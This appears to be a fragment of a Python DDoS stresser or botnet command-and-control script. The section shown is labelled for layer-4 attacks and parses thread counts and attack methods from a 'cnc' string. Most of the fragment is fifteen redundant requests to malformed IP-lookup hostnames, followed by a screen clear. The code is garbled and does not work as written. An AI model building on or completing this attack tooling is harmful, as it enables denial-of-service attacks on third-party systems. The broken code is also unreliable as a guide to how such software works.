    ...
    while(True):
        ...
        #####L4####
            ...
            try:
                ...
                threads=cnc.split(4)
                methods=cnc.split(5)
                ip= requests.get('https://api.ipify+-V0.org').text.strip()
                ip= requests.get('https://api.ipify+V0.org').text.strip()
                ip= requests.get('https://api.ipify-V0.org').text.strip()
                ip= requests.get('https://api.Mayhem+-V0.org').text.strip()
                ip= requests.get('https://api.Mayhem+V0.org').text.strip()
                ip= requests.get('https://api.Mayhem-V0.org').text.strip()
                ip= requests.get('https://api.Roit+-V0.org').text.strip()
                ip= requests.get('https://api.Roit+V0.org').text.strip()
                ip= requests.get('https://api.Roit-V0.org').text.strip()
                ip= requests.get('https://api.Niroit+-V0.org').text.strip()
                ip= requests.get('https://api.Niroit+V0.org').text.strip()
                ip= requests.get('https://api.Niroit-V0.org').text.strip()
                ip= requests.get('https://api.Saker+-V0.org').text.strip()
                ip= requests.get('https://api.Saker+V0.org').text.strip()
                ip= requests.get('https://api.Saker-V0.org').text.strip()
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
